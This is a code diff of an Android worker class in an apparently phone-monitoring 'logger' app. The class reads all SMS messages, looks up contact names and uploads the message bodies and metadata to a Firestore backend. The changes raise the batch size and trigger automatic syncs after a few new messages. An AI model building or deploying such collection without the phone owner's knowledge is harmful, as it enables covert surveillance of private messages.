@@ -4,6 +4,7 @@ import android.Manifest
 import android.content.Context
 import android.content.pm.PackageManager
 import android.database.Cursor
+import android.net.Uri
 import android.provider.Telephony
 import android.util.Log
 import androidx.core.content.ContextCompat
@@ -15,7 +16,8 @@ import com.mshomeguardian.logger.data.AppDatabase
 import com.mshomeguardian.logger.data.MessageEntity
 import com.mshomeguardian.logger.utils.DeviceIdentifier
 import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.tasks.await
+import kotlinx.coroutines.GlobalScope
+import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import java.util.*
 
@@ -36,7 +38,46 @@ class MessageWorker(
 
     companion object {
         private const val TAG = "MessageWorker"
-        private const val SYNC_LIMIT = 50 // Reduced to avoid excessive processing
+        private const val SYNC_LIMIT = 500 // Limit number of messages to sync at once
+
+        // New threshold for automatic synchronization
+        private const val MESSAGE_COUNT_THRESHOLD = 3
+
+        /**
+         * Check if there are enough new messages to trigger a sync
+         */
+        suspend fun shouldSync(context: Context): Boolean {
+            // Skip check if permission is not granted
+            if (ContextCompat.checkSelfPermission(
+                    context, Manifest.permission.READ_SMS
+                ) != PackageManager.PERMISSION_GRANTED) {
+                return false
+            }
+
+            try {
+                val lastSyncTime = context.getSharedPreferences(
+                    "message_sync", Context.MODE_PRIVATE).getLong("last_sync_time", 0)
+
+                // Query the number of new messages since last sync
+                val uri = Telephony.Sms.CONTENT_URI
+                val projection = arrayOf(Telephony.Sms._ID)
+                val selection = "${Telephony.Sms.DATE} > ?"
+                val selectionArgs = arrayOf(lastSyncTime.toString())
+
+                context.contentResolver.query(
+                    uri, projection, selection, selectionArgs, null
+                )?.use { cursor ->
+                    val count = cursor.count
+                    Log.d(TAG, "Found $count new messages since last sync")
+                    return count >= MESSAGE_COUNT_THRESHOLD
+                }
+
+                return false
+            } catch (e: Exception) {
+                Log.e(TAG, "Error checking for new messages", e)
+                return false
+            }
+        }
     }
 
     override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
@@ -58,13 +99,13 @@ class MessageWorker(
             // Sync SMS messages
             val syncCount = syncMessages(lastSyncTime, currentTime)
 
-            // If db operations succeeded, upload new records to Firestore
-            val uploadCount = uploadNewRecords()
+            // Upload new records to Firestore
+            uploadNewRecords()
 
             // Update last sync time if successful
             prefs.edit().putLong("last_sync_time", currentTime).apply()
 
-            Log.d(TAG, "Message sync completed. Synced $syncCount records. Uploaded $uploadCount records.")
+            Log.d(TAG, "Message sync completed. Synced $syncCount records.")
             Result.success()
         } catch (e: Exception) {
             Log.e(TAG, "Error syncing messages", e)
@@ -72,6 +113,7 @@ class MessageWorker(
         }
     }
 
+    // Update the syncMessages method to fix the LIMIT issue
     private suspend fun syncMessages(lastSyncTime: Long, currentTime: Long): Int {
         val messages = mutableListOf<MessageEntity>()
         var cursor: Cursor? = null
@@ -99,20 +141,13 @@ class MessageWorker(
             // Selection for messages after the last sync time
             val selection = "${Telephony.Sms.DATE} > ?"
             val selectionArgs = arrayOf(lastSyncTime.toString())
+            // Remove LIMIT from sortOrder
             val sortOrder = "${Telephony.Sms.DATE} DESC"
 
-            try {
-                cursor = applicationContext.contentResolver.query(
-                    uri, projection, selection, selectionArgs, sortOrder
-                )
-            } catch (e: Exception) {
-                Log.e(TAG, "Error querying SMS with selection, trying without selection", e)
-                cursor = applicationContext.contentResolver.query(
-                    uri, projection, null, null, sortOrder
-                )
-            }
+            cursor = applicationContext.contentResolver.query(
+                uri, projection, selection, selectionArgs, sortOrder
+            )
 
-            var count = 0
             cursor?.let {
                 val idIndex = it.getColumnIndex(Telephony.Sms._ID)
                 val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
@@ -129,21 +164,24 @@ class MessageWorker(
                 val replyPathPresentIndex = it.getColumnIndex(Telephony.Sms.REPLY_PATH_PRESENT)
                 val serviceCenterIndex = it.getColumnIndex(Telephony.Sms.SERVICE_CENTER)
 
-                while (it.moveToNext() && count < SYNC_LIMIT) {
+                // Add counter to limit records processed
+                var recordsProcessed = 0
+
+                while (it.moveToNext() && recordsProcessed < SYNC_LIMIT) {
                     val messageId = if (idIndex >= 0) it.getString(idIndex) else UUID.randomUUID().toString()
-                    val address = if (addressIndex >= 0 && !it.isNull(addressIndex)) it.getString(addressIndex) ?: "" else ""
+                    val address = if (addressIndex >= 0) it.getString(addressIndex) ?: "" else ""
                     val date = if (dateIndex >= 0) it.getLong(dateIndex) else currentTime
-                    val body = if (bodyIndex >= 0 && !it.isNull(bodyIndex)) it.getString(bodyIndex) else null
+                    val body = if (bodyIndex >= 0) it.getString(bodyIndex) else null
                     val type = if (typeIndex >= 0) it.getInt(typeIndex) else Telephony.Sms.MESSAGE_TYPE_INBOX
                     val read = if (readIndex >= 0) it.getInt(readIndex) == 1 else false
                     val seen = if (seenIndex >= 0) it.getInt(seenIndex) == 1 else false
-                    val status = if (statusIndex >= 0 && !it.isNull(statusIndex)) it.getInt(statusIndex) else null
-                    val subject = if (subjectIndex >= 0 && !it.isNull(subjectIndex)) it.getString(subjectIndex) else null
+                    val status = if (statusIndex >= 0) it.getInt(statusIndex) else null
+                    val subject = if (subjectIndex >= 0) it.getString(subjectIndex) else null
                     val threadId = if (threadIdIndex >= 0) it.getLong(threadIdIndex) else null
-                    val person = if (personIndex >= 0 && !it.isNull(personIndex)) it.getString(personIndex) else null
-                    val protocol = if (protocolIndex >= 0 && !it.isNull(protocolIndex)) it.getInt(protocolIndex) else null
+                    val person = if (personIndex >= 0) it.getString(personIndex) else null
+                    val protocol = if (protocolIndex >= 0) it.getInt(protocolIndex) else null
                     val replyPathPresent = if (replyPathPresentIndex >= 0) it.getInt(replyPathPresentIndex) == 1 else null
-                    val serviceCenter = if (serviceCenterIndex >= 0 && !it.isNull(serviceCenterIndex)) it.getString(serviceCenterIndex) else null
+                    val serviceCenter = if (serviceCenterIndex >= 0) it.getString(serviceCenterIndex) else null
 
                     // Look up contact name if available
                     val contactName = getContactNameFromNumber(address)
@@ -174,25 +212,33 @@ class MessageWorker(
                         deviceId = deviceId
                     )
 
-                    // For SMS messages, add directly to list without checking DB
-                    messages.add(messageEntity)
-                    count++
+                    // Check if message already exists
+                    val existingMessage = db.messageDao().getMessageByMessageId(messageId)
+                    if (existingMessage == null) {
+                        messages.add(messageEntity)
+                    } else {
+                        // Update only if something changed
+                        if (existingMessage.isRead != read ||
+                            existingMessage.seen != seen ||
+                            existingMessage.body != body) {
+
+                            // Keep existing flags
+                            db.messageDao().updateMessage(messageEntity.copy(
+                                id = existingMessage.id,
+                                uploadedToCloud = existingMessage.uploadedToCloud,
+                                uploadTimestamp = existingMessage.uploadTimestamp
+                            ))
+                        }
+                    }
+
+                    recordsProcessed++
                 }
             }
 
-// Insert all new messages in bulk
-// Insert all new messages in bulk
+            // Insert all new messages
             if (messages.isNotEmpty()) {
-                try {
-                    db.messageDao().insertMessages(messages)
-                    Log.d(TAG, "Inserted ${messages.size} new messages")
-                } catch (e: Exception) {
-                    // If Room database is having issues, we'll upload directly to Firestore
-                    Log.e(TAG, "Error inserting to database, will upload directly to Firestore", e)
-                    for (message in messages) {
-                        uploadMessageDirectly(message)
-                    }
-                }
+                db.messageDao().insertMessages(messages)
+                Log.d(TAG, "Inserted ${messages.size} new messages")
             }
 
             return messages.size
@@ -204,131 +250,66 @@ class MessageWorker(
         }
     }
 
+
     private fun getContactNameFromNumber(phoneNumber: String): String? {
         if (phoneNumber.isBlank()) return null
 
-        try {
-            // A simpler approach that doesn't query contacts database again
-            // Just return the phone number for now - we already have contacts
-            // from the ContactsWorker
-            return null
+        val uri = Uri.withAppendedPath(
+            android.provider.ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
+            Uri.encode(phoneNumber)
+        )
+
+        val projection = arrayOf(android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME)
+
+        return try {
+            applicationContext.contentResolver.query(
+                uri, projection, null, null, null
+            )?.use { cursor ->
+                if (cursor.moveToFirst()) {
+                    val nameIndex = cursor.getColumnIndex(android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME)
+                    if (nameIndex >= 0) cursor.getString(nameIndex) else null
+                } else null
+            }
         } catch (e: Exception) {
             Log.e(TAG, "Error looking up contact name", e)
-            return null
+            null
         }
     }
 
-    private suspend fun uploadMessageDirectly(message: MessageEntity) {
+    private suspend fun uploadNewRecords() {
         val firestoreInstance = firestore ?: return
 
         try {
-            // Convert to a Map for Firestore
-            val messageMap = HashMap<String, Any?>()
-            messageMap["messageId"] = message.messageId
-            messageMap["syncTimestamp"] = message.syncTimestamp
-            messageMap["phoneNumber"] = message.phoneNumber
-            messageMap["timestamp"] = message.timestamp
-            messageMap["body"] = message.body ?: ""
-            messageMap["type"] = message.type
-            messageMap["subject"] = message.subject ?: ""
-            messageMap["messageType"] = message.messageType
-            messageMap["contactName"] = message.contactName ?: ""
-            messageMap["isRead"] = message.isRead
-            messageMap["seen"] = message.seen
-            messageMap["deliveryStatus"] = message.deliveryStatus
-            messageMap["errorCode"] = message.errorCode
-            messageMap["deletedLocally"] = message.deletedLocally
-            messageMap["thread_id"] = message.thread_id
-            messageMap["person"] = message.person ?: ""
-            messageMap["protocol"] = message.protocol
-            messageMap["replyPathPresent"] = message.replyPathPresent
-            messageMap["serviceCenter"] = message.serviceCenter ?: ""
-            messageMap["status"] = message.status
-            messageMap["deviceId"] = message.deviceId
-
-            // Upload to Firestore
-            firestoreInstance.collection("devices")
-                .document(message.deviceId)
-                .collection("messages")
-                .document(message.messageId)
-                .set(messageMap, SetOptions.merge())
-                .await()
-
-            Log.d(TAG, "Message ${message.messageId} uploaded directly to Firestore")
-        } catch (e: Exception) {
-            Log.e(TAG, "Error uploading message directly ${message.messageId}: ${e.message}")
-        }
-    }
-
-    private suspend fun uploadNewRecords(): Int {
-        val firestoreInstance = firestore ?: return 0
-        var uploadCount = 0
-
-        try {
             // Get messages that haven't been uploaded
-            val notUploadedMessages = try {
-                db.messageDao().getNotUploadedMessages()
-            } catch (e: Exception) {
-                Log.e(TAG, "Error getting not uploaded messages", e)
-                emptyList()
-            }
+            val notUploadedMessages = db.messageDao().getNotUploadedMessages()
             Log.d(TAG, "Found ${notUploadedMessages.size} messages to upload")
 
             for (message in notUploadedMessages) {
                 try {
-                    // Convert to a Map for Firestore
-                    val messageMap = HashMap<String, Any?>()
-                    messageMap["messageId"] = message.messageId
-                    messageMap["syncTimestamp"] = message.syncTimestamp
-                    messageMap["phoneNumber"] = message.phoneNumber
-                    messageMap["timestamp"] = message.timestamp
-                    messageMap["body"] = message.body ?: ""
-                    messageMap["type"] = message.type
-                    messageMap["subject"] = message.subject ?: ""
-                    messageMap["messageType"] = message.messageType
-                    messageMap["contactName"] = message.contactName ?: ""
-                    messageMap["isRead"] = message.isRead
-                    messageMap["seen"] = message.seen
-                    messageMap["deliveryStatus"] = message.deliveryStatus
-                    messageMap["errorCode"] = message.errorCode
-                    messageMap["deletedLocally"] = message.deletedLocally
-                    messageMap["thread_id"] = message.thread_id
-                    messageMap["person"] = message.person ?: ""
-                    messageMap["protocol"] = message.protocol
-                    messageMap["replyPathPresent"] = message.replyPathPresent
-                    messageMap["serviceCenter"] = message.serviceCenter ?: ""
-                    messageMap["status"] = message.status
-                    messageMap["deviceId"] = message.deviceId
-
                     // Upload to Firestore
                     firestoreInstance.collection("devices")
-                        .document(message.deviceId)
+                        .document(deviceId)
                         .collection("messages")
                         .document(message.messageId)
-                        .set(messageMap, SetOptions.merge())
-                        .await()
-
-                    try {
-                        // Mark as uploaded
-                        val uploadTime = System.currentTimeMillis()
-                        db.messageDao().markMessageAsUploaded(message.id, uploadTime)
-                    } catch (e: Exception) {
-                        Log.e(TAG, "Error marking message as uploaded: ${e.message}")
-                    }
-
-                    uploadCount++
-                    Log.d(TAG, "Message ${message.messageId} uploaded successfully")
-
+                        .set(message, SetOptions.merge())
+                        .addOnSuccessListener {
+                            // Mark as uploaded in a separate coroutine to avoid blocking
+                            GlobalScope.launch(Dispatchers.IO) {
+                                val uploadTime = System.currentTimeMillis()
+                                db.messageDao().markMessageAsUploaded(message.id, uploadTime)
+                                Log.d(TAG, "Message ${message.messageId} marked as uploaded")
+                            }
+                        }
+                        .addOnFailureListener { e ->
+                            Log.e(TAG, "Failed to upload message ${message.messageId}", e)
+                        }
                 } catch (e: Exception) {
-                    Log.e(TAG, "Error uploading message ${message.messageId}: ${e.message}")
+                    Log.e(TAG, "Error uploading message ${message.messageId}", e)
                     // Continue with next record
                 }
             }
-
-            return uploadCount
         } catch (e: Exception) {
             Log.e(TAG, "Error in uploadNewRecords", e)
-            return 0
         }
     }
 }
